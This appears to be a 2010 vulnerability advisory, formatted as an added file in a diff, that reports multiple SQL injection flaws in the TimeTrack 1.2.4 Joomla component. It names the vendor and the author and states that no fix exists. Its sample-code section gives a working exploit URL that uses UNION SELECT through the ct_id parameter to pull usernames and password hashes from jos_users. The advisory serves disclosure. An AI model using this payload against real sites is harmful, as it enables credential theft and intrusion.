@@ -1,0 +1,65 @@
+TimeTrack 1.2.4 Joomla Component Multiple SQL Injection Vulnerabilities
+
+ Name              TimeTrack
+ Vendor            http://www.itrn.de
+ Versions Affected 1.2.4
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-09-22
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+TimeTrack  is  a  time tracking Component for Joomla! 1.5
+to  collect,  categorize  and  evaluate working hours and
+services.  Monthly  Reports can generated and exported as
+PDF or CSV-File.
+
+
+II. DESCRIPTION
+_______________
+
+Many numeric parameters are not properly sanitised before
+being  used  in  a  SQL  query. This  can be exploited to
+manipulate SQL queries by injecting arbitrary SQL code.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple SQL Injection
+ 
+
+A) Multiple SQL Injection
+_________________________
+
+Each  module  is  vulnerable to SQL Injection because all
+numeric fields are not sanitised.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple SQL Injection
+
+http://host/path/components/index.php?option=com_timetrack&view=timetrack&ct_id=-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,CONCAT(username,0x3A,password) FROM jos_users
+
+
+V. FIX
+______
+
+No fix.
+
